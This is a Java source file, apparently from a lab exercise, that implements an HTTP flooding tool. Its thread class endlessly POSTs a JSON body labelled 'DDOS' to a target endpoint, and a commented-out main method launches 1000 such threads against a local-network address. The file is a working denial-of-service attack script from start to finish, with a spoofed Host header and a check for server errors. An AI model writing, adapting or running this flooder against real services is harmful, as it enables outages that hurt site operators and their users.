package FOIS_LAB;

import java.io.IOException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class HTTPFlooder extends Thread {
    public static int progress;
    public String hostname;
    public String port;
    public String path;
    public String request;
    public HttpURLConnection conn;
    public URL url;
    private final AtomicBoolean running = new AtomicBoolean(true);
    final public String param = "param1=" + URLEncoder.encode("87845", "UTF-8");

    public HTTPFlooder(String hn, String port, String path) throws MalformedURLException, UnsupportedEncodingException {
        this.hostname = hn;
        this.port = port;
        this.path = path;
        this.request = HelperFunctions.schemeAdder(requestMaker(hn, port, path));
        this.url = new URL(request);
    }

    public HttpURLConnection getConn() {
        return conn;
    }

    public URL getUrl() {
        return url;
    }

    public void setRequest(String req) {
        this.request = req;
    }

    public String getRequest() {
        return request;
    }

    public void setUrl(URL url) throws MalformedURLException {
        this.url = url;
    }

    public String getHostname() {
        return hostname;
    }

    public String getPort() {
        return port;
    }

    public String getPath() {
        return path;
    }



    public String requestMaker(String hn, String port, String path){
        return hn + ":" + port + "/" + path;
    }

//    public static void main(String... args) throws Exception {
//        for (int i = 0; i < 1000; i++) {
//            HTTPFlooder thread = new HTTPFlooder("192.168.43.194", "5000", "tasks/api_create");
//            thread.start();
//        }
//    }
        public void run() {
            while (running.get()) {
                try {
                    jsonFlood();
                } catch (IOException e) {
                }
            }
        }

        public void requestFlood() throws Exception {

            HttpURLConnection connection = (HttpURLConnection) getUrl().openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Java Program");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            //connection.getOutputStream().write();

            System.out.println(this + " " + connection.getResponseCode() +" "+connection.getResponseMessage());
            connection.getInputStream();

            if(connection.getResponseCode() == 500) HTTPFlooder.progress = 100;
            else progress = 0;
        }
        public void jsonFlood() throws IOException {
            byte[] out = "{\"title\":\"DDOS\",\"description\":\"This is an attack\",\"due_date\":\"4:00\"}" .getBytes(StandardCharsets.UTF_8);
            int length = out.length;
            if(getUrl().toString().isEmpty()) {
                System.exit(2);
            }
            conn = (HttpURLConnection) getUrl().openConnection();
            conn.setFixedLengthStreamingMode(length);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("charset", "utf-8");
            conn.setRequestProperty("Host", "localhost");
            conn.setRequestProperty("User-Agent", "Java Program");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("Content-Length", param);
            try(OutputStream os = conn.getOutputStream()) {
                os.write(out);
            }
        }
    }
